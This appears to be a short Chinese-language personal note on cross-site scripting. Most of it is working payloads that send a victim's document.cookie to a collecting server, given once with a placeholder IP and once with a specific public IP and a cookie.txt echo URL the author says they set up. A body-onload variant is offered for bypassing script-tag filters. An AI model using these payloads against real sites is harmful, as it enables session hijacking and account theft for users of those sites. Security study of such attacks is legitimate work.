# XSS远程执行漏洞

### 常用js语句
````

document.cookie				用于js获取当前网页的cookie值
window.location.href			 用于获取当前页面地址链接
window.location.href='www.baidu.com'	  用于相当于跳转地址

````

常用playload：

````
<script>window.location.href='http://[ip]/xss.php?cookie='+document.cookie</script>
````
     




### 我直接买了一个服务器并且开放了读写权限可以拿来实验XSS

````
相关的ip和playload
<script>window.location.href='http://106.53.207.220/xss.php?cookie='+document.cookie</script>


回显请看
http://106.53.207.220/cookie.txt
````


## 绕过

* 过滤script标签
* 
````
<body onload="document.location.href='http://[ip]/xss.php?xss='+document.cookie"></body>

````












